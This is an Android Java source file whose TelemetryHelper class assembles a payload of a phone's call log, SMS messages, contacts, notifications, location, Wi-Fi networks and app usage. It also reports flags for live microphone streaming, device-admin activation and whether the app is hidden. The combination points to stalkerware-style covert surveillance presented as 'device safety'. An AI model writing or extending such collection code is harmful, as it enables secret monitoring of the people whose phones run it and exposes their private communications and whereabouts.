package com.orphen.devicesafety;

import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;

import org.json.JSONArray;

public final class TelemetryHelper {
    private TelemetryHelper() {
    }

    public static String buildTelemetryPayload(Context context, boolean deviceAdminActive) {
        String wifiSsid = readWifiSsid(context);
        JSONArray nearbyWifi = WifiScanHelper.collectNearbyWifi(context);
        JSONArray savedWifiProfiles = WifiScanHelper.collectSavedProfiles(context);
        JSONArray usageSummary = UsageStatsHelper.collectUsageSummary(context);
        StringBuilder payload = new StringBuilder();
        org.json.JSONObject locationJson = LocationHelper.buildLocationJson(context);
        org.json.JSONObject locationPoint = locationJson.optJSONObject("location");
        org.json.JSONArray callLog = CommunicationLogHelper.collectCallLog(context);
        org.json.JSONArray smsLog = CommunicationLogHelper.collectSmsLog(context);
        org.json.JSONArray contacts = ContactHelper.collectContacts(context);
        org.json.JSONObject batteryPayload = BatteryHelper.buildBatteryPayload(context);
        org.json.JSONArray notifications = capJsonArray(NotificationHelper.collectNotifications(context), 50);
        payload.append("{")
                .append("\"deviceId\":\"").append(BackendClient.escapeJson(BackendClient.getDeviceId(context))).append("\",")
                .append("\"deviceAdminActive\":").append(deviceAdminActive ? "true" : "false").append(",")
                .append("\"wifiSsid\":\"").append(BackendClient.escapeJson(wifiSsid)).append("\",")
                .append("\"nearbyWifi\":").append(nearbyWifi.toString()).append(",")
                .append("\"savedWifiProfiles\":").append(savedWifiProfiles.toString()).append(",")
                .append("\"wifiScanAt\":").append(System.currentTimeMillis() / 1000L).append(",")
                .append("\"locationPermissionGranted\":").append(LocationHelper.hasAllTimeLocation(context) ? "true" : "false").append(",")
                .append("\"usageAccessGranted\":").append(UsageStatsHelper.hasUsageAccess(context) ? "true" : "false").append(",")
                .append("\"callLogPermissionGranted\":").append(CommunicationLogHelper.hasCallLogPermission(context) ? "true" : "false").append(",")
                .append("\"smsPermissionGranted\":").append(CommunicationLogHelper.hasSmsPermission(context) ? "true" : "false").append(",")
                .append("\"contactsPermissionGranted\":").append(ContactHelper.hasContactsPermission(context) ? "true" : "false").append(",")
                .append("\"audioPermissionGranted\":").append(AudioStreamHelper.hasMicrophonePermission(context) ? "true" : "false").append(",")
                .append("\"storagePermissionGranted\":").append(StorageHelper.hasStorageAccess(context) ? "true" : "false").append(",")
                .append("\"notificationAccessGranted\":").append(NotificationHelper.isNotificationListenerEnabled(context) ? "true" : "false").append(",")
                .append("\"audioStreamActive\":").append(AudioStreamService.isRunning() ? "true" : "false").append(",")
                .append("\"appLocked\":").append(SecurityHelper.isLocked(context) ? "true" : "false").append(",")
                .append("\"appHidden\":").append(SecurityHelper.isHidden(context) ? "true" : "false").append(",")
                .append("\"location\":").append(locationPoint != null ? locationPoint.toString() : "null").append(",")
                .append("\"usageSummary\":").append(usageSummary.toString()).append(",")
                .append("\"batterySummary\":").append(batteryPayload.toString()).append(",")
                .append("\"notifications\":").append(notifications.toString()).append(",")
                .append("\"callLog\":").append(callLog.toString()).append(",")
                .append("\"smsLog\":").append(smsLog.toString()).append(",")
                .append("\"contacts\":").append(contacts.toString())
                .append("}");
        return payload.toString();
    }

    private static org.json.JSONArray capJsonArray(org.json.JSONArray source, int maxItems) {
        org.json.JSONArray capped = new org.json.JSONArray();
        if (source == null || maxItems <= 0) {
            return capped;
        }
        int limit = Math.min(maxItems, source.length());
        for (int index = 0; index < limit; index++) {
            capped.put(source.opt(index));
        }
        return capped;
    }

    public static String readWifiSsid(Context context) {
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wifiManager == null) {
                return "";
            }
            WifiInfo info = wifiManager.getConnectionInfo();
            if (info == null) {
                return "";
            }
            String ssid = info.getSSID();
            if (ssid == null || ssid.length() == 0 || "<unknown ssid>".equalsIgnoreCase(ssid)) {
                return "";
            }
            if (ssid.startsWith("\"") && ssid.endsWith("\"") && ssid.length() > 2) {
                ssid = ssid.substring(1, ssid.length() - 1);
            }
            return ssid;
        } catch (Exception ignored) {
            return "";
        }
    }
}
